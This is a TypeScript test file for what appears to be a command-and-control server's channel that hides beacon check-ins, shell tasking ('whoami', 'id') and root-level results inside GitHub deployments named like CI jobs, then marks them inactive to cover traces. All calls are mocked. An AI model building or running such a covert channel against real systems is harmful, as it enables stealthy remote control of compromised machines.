import { describe, it, expect, mock, beforeEach } from "bun:test";
import { PagesChannel } from "../channels/PagesChannel.ts";
import { BeaconRegistry } from "../BeaconRegistry.ts";
import { TaskQueue } from "../TaskQueue.ts";
import { generateOperatorKeyPair, bytesToBase64, sealBox } from "../crypto/sodium.ts";

// ── Octokit mock factory ──────────────────────────────────────────────────────

function makeOctokit(overrides: Record<string, any> = {}) {
  return {
    rest: {
      repos: {
        listDeployments:        mock(async () => ({ data: [] })),
        createDeployment:       mock(async () => ({ data: { id: 100 } })),
        createDeploymentStatus: mock(async () => ({})),
        ...(overrides.repos ?? {}),
      },
    },
    ...overrides,
  } as any;
}

describe("PagesChannel", () => {
  let registry: BeaconRegistry;
  let queue: TaskQueue;
  let operatorKp: { publicKey: Uint8Array; secretKey: Uint8Array };

  beforeEach(async () => {
    registry   = new BeaconRegistry("/tmp/pages-channel-test-registry");
    queue      = new TaskQueue();
    operatorKp = await generateOperatorKeyPair();
  });

  it("start() and stop() do not throw", () => {
    const ch = new PagesChannel(registry, queue, {
      owner: "owner", repo: "repo", token: "tok",
      operatorSecretKey: operatorKp.secretKey,
      pollIntervalMs: 60_000,
      octokit: makeOctokit(),
    });
    ch.start();
    ch.stop();
  });

  it("poll registers beacon from ACK deployment", async () => {
    const beaconId = "a1b2c3d4-pages-ack-beacon";
    const beaconKp = await generateOperatorKeyPair();
    const id8 = beaconId.slice(0, 8);

    const ackDescription = JSON.stringify({
      beaconId,
      publicKey: await bytesToBase64(beaconKp.publicKey),
      hostname: "pageshost", username: "pagesuser", os: "linux", arch: "amd64",
      checkinAt: new Date().toISOString(),
    });

    const octokit = makeOctokit({
      repos: {
        listDeployments: mock(async () => ({
          data: [{
            id: 55,
            environment: `ci-${id8}`,
            description: ackDescription,
            payload: "",
          }],
        })),
        createDeployment:       mock(async () => ({ data: { id: 101 } })),
        createDeploymentStatus: mock(async () => ({})),
      },
    });

    const ch = new PagesChannel(registry, queue, {
      owner: "owner", repo: "repo", token: "tok",
      operatorSecretKey: operatorKp.secretKey,
      pollIntervalMs: 60_000,
      octokit,
    });

    await (ch as any).poll();

    const beacon = registry.get(beaconId);
    expect(beacon).not.toBeUndefined();
    expect(beacon!.hostname).toBe("pageshost");
    expect(beacon!.publicKey).toBe(await bytesToBase64(beaconKp.publicKey));
  });

  it("poll delivers pending tasks to pages beacon via task deployment", async () => {
    const beaconId = "abc5f678-pages-task-beacon";
    const beaconKp = await generateOperatorKeyPair();
    const pubB64   = await bytesToBase64(beaconKp.publicKey);

    // Register beacon and queue a task
    registry.register({
      beaconId, issueNumber: 0, publicKey: pubB64,
      hostname: "h", username: "u", os: "linux", arch: "x64", seq: 0,
    });
    queue.queueTask(beaconId, "shell", { cmd: "whoami" });

    const octokit = makeOctokit({
      repos: {
        listDeployments:        mock(async () => ({ data: [] })),
        createDeployment:       mock(async () => ({ data: { id: 200 } })),
        createDeploymentStatus: mock(async () => ({})),
      },
    });

    const ch = new PagesChannel(registry, queue, {
      owner: "owner", repo: "repo", token: "tok",
      operatorSecretKey: operatorKp.secretKey,
      pollIntervalMs: 60_000,
      octokit,
    });

    // Prime the pages-beacon set
    (ch as any).pagesBeacons.add(beaconId);

    await (ch as any).poll();

    // A task deployment should have been created
    expect(octokit.rest.repos.createDeployment).toHaveBeenCalled();
    const createCall = octokit.rest.repos.createDeployment.mock.calls[0]![0] as any;
    expect(createCall.environment).toMatch(/^ci-t-/);
    // Payload should be a JSON string with nonce+ciphertext
    const payloadObj = JSON.parse(createCall.payload);
    expect(payloadObj).toHaveProperty("nonce");
    expect(payloadObj).toHaveProperty("ciphertext");
  });

  it("poll processes result deployment, marks task completed", async () => {
    const beaconId = "c0de9012-pages-result-beacon";
    const beaconKp = await generateOperatorKeyPair();
    const id8 = beaconId.slice(0, 8);

    registry.register({
      beaconId, issueNumber: 0, publicKey: await bytesToBase64(beaconKp.publicKey),
      hostname: "h", username: "u", os: "linux", arch: "x64", seq: 0,
    });
    const task = queue.queueTask(beaconId, "shell", { cmd: "id" });
    queue.markDelivered(task.taskId);

    // Seal result with operator public key
    const resultPayload = JSON.stringify({
      taskId: task.taskId, beaconId,
      success: true, output: "uid=0(root)", completedAt: new Date().toISOString(),
    });
    const sealed = await sealBox(resultPayload, operatorKp.publicKey);

    const octokit = makeOctokit({
      repos: {
        listDeployments: mock(async () => ({
          data: [{
            id: 300,
            environment: `ci-r-${id8}`,
            payload: sealed,
            description: "result",
          }],
        })),
        createDeployment:       mock(async () => ({ data: { id: 301 } })),
        createDeploymentStatus: mock(async () => ({})),
      },
    });

    const ch = new PagesChannel(registry, queue, {
      owner: "owner", repo: "repo", token: "tok",
      operatorSecretKey: operatorKp.secretKey,
      pollIntervalMs: 60_000,
      octokit,
    });

    await (ch as any).poll();

    const completed = queue.getTask(task.taskId);
    expect(completed?.state).toBe("completed");

    // Cleanup deployment status should have been created
    expect(octokit.rest.repos.createDeploymentStatus).toHaveBeenCalled();
    const statusCall = octokit.rest.repos.createDeploymentStatus.mock.calls[0]![0] as any;
    expect(statusCall.deployment_id).toBe(300);
    expect(statusCall.state).toBe("inactive");
  });
});
